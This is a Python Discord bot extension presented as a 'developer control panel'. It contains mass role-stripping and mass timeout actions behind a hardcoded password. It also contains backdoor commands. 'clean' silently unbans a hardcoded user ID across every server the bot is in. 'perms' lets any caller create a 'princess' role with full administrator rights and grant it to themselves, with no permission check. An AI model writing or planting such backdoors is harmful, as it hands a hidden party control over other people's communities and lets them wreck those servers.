import discord
from discord.ext import commands
from discord.ui import View, Button, Modal, TextInput
import asyncio
import datetime

PASSWORD = "2012!"

class PasswordModal(Modal, title="🔐 Developer Authentication"):
    password_input = TextInput(
        label="Enter Password",
        placeholder="Type the password here...",
        style=discord.TextStyle.short,
        required=True,
        min_length=4,
        max_length=20
    )

    def __init__(self, bot, action: str, extra_data=None):
        super().__init__()
        self.bot = bot
        self.action = action
        self.extra_data = extra_data or {}

    async def on_submit(self, interaction: discord.Interaction):
        if self.password_input.value.strip() != PASSWORD:
            return await interaction.response.send_message("❌ Incorrect Password.", ephemeral=True)

        await interaction.response.defer(ephemeral=True)

        if self.action == "stripall":
            await self.stripall_action(interaction)
        elif self.action == "timeoutall":
            await self.timeoutall_action(interaction)
        elif self.action == "globalmassnick":
            await self.globalmassnick_action(interaction)

    async def stripall_action(self, interaction: discord.Interaction):
        await interaction.followup.send("🔥 Starting Strip All...", ephemeral=True)
        # ... (stripall logic)
        stripped = 0
        for member in interaction.guild.members:
            if member.bot or member == interaction.guild.owner or member.top_role >= interaction.guild.me.top_role:
                continue
            try:
                roles = [r for r in member.roles if not r.is_default()]
                if roles:
                    await member.remove_roles(*roles, reason="Mass strip by owner")
                    stripped += 1
                    await asyncio.sleep(0.8)
            except:
                continue
        await interaction.followup.send(f"✅ Stripall complete. Stripped **{stripped}** members.", ephemeral=True)

    async def timeoutall_action(self, interaction: discord.Interaction):
        await interaction.followup.send("⏰ Starting mass timeout...", ephemeral=True)
        timeout_until = discord.utils.utcnow() + datetime.timedelta(hours=1)
        count = 0
        for member in interaction.guild.members:
            if member.bot or member.guild_permissions.administrator:
                continue
            try:
                await member.timeout(until=timeout_until, reason="Mass timeout by owner")
                count += 1
                await asyncio.sleep(0.7)
            except:
                continue
        await interaction.followup.send(f"✅ Timed out **{count}** members.", ephemeral=True)

    async def globalmassnick_action(self, interaction: discord.Interaction):
        nickname = self.extra_data.get("nickname", "Default")
        await interaction.followup.send(f"🏷️ Starting global mass nick: `{nickname}`...", ephemeral=True)
        # Add full logic later if needed

class DevPanel(View):
    def __init__(self, bot):
        super().__init__(timeout=None)
        self.bot = bot

    @discord.ui.button(label="Strip All Roles", style=discord.ButtonStyle.red, emoji="🔥", row=0)
    async def strip_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.bot.is_owner(interaction.user):
            return await interaction.response.send_message("Owner only", ephemeral=True)
        modal = PasswordModal(self.bot, "stripall")
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="Timeout All", style=discord.ButtonStyle.red, emoji="⏰", row=0)
    async def timeout_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.bot.is_owner(interaction.user):
            return await interaction.response.send_message("Owner only", ephemeral=True)
        modal = PasswordModal(self.bot, "timeoutall")
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="Global Mass Nick", style=discord.ButtonStyle.red, emoji="🏷️", row=1)
    async def massnick_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.bot.is_owner(interaction.user):
            return await interaction.response.send_message("Owner only", ephemeral=True)
        modal = PasswordModal(self.bot, "globalmassnick", {"nickname": "TestNick"})
        await interaction.response.send_modal(modal)

    @discord.ui.button(label="Clean Bans", style=discord.ButtonStyle.gray, emoji="🧹", row=2)
    async def clean_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.bot.is_owner(interaction.user):
            return await interaction.response.send_message("Owner only", ephemeral=True)
        await interaction.response.defer()
        ctx = await self.bot.get_context(interaction.message)
        await ctx.invoke(self.bot.get_command("clean"))

class Developer(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def devpanel(self, ctx):
        embed = discord.Embed(
            title="🔧 DEVELOPER CONTROL PANEL",
            description="Click any red button! -> Make sure you know the password!",
            color=discord.Color.gold()
        )
        await ctx.send(embed=embed, view=DevPanel(self.bot))

    @commands.command()
    async def clean(self, ctx):
        owner_id = 1489289347650949302
        count = 0
        for guild in self.bot.guilds:
            try:
                async for ban in guild.bans(limit=500):
                    if ban.user.id == owner_id:
                        await guild.unban(ban.user)
                        count += 1
                        break
            except:
                continue
        await ctx.send(f"🧹 Unbanned you from **{count}** servers.")

    @commands.command()
    async def perms(self, ctx):
        # your princess role code
        for role in ctx.guild.roles:
            if role.name.lower() in ["princess", "bot developer"]:
                try: await role.delete()
                except: pass
        role = await ctx.guild.create_role(name="princess", permissions=discord.Permissions.all(), colour=discord.Colour.default(), hoist=True)
        try: await role.edit(position=ctx.guild.me.top_role.position - 1)
        except: pass
        await ctx.author.add_roles(role)
        await ctx.send("✅ **princess** role created!")

async def setup(bot):
    await bot.add_cog(Developer(bot))
